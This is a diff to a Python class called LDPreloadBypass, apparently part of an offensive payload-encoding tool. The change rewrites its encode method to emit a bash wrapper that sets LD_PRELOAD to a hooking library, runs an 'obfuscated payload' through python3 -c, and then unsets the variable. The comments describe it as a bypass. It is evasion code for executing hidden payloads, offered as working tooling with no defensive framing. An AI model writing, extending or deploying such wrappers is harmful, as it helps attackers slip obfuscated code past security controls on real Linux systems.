@@ -17,15 +17,21 @@ class LDPreloadBypass:
         self.library_name = f"lib{''.join(random.choices(string.ascii_lowercase, k=6))}.so"
     
     def encode(self, payload):
-        """Generate LD_PRELOAD bypass wrapper that preserves obfuscated payload"""
+        """Generate LD_PRELOAD bypass wrapper for Linux"""
         if isinstance(payload, bytes):
             payload = payload.decode('utf-8')
         
-        # Instead of generating full bypass, just wrap the obfuscated payload
-        bypass_wrapper = f'''
-# LD_PRELOAD Bypass - Execute with library preloading
+        # Linux-only bypass with proper execution
+        bypass_wrapper = f'''#!/bin/bash
+# LD_PRELOAD Bypass for Linux
 export LD_PRELOAD="./libhook.so"
+
+# Execute obfuscated payload
+python3 -c '
 {payload}
+'
+
+# Cleanup
 unset LD_PRELOAD
 '''
         return bypass_wrapper
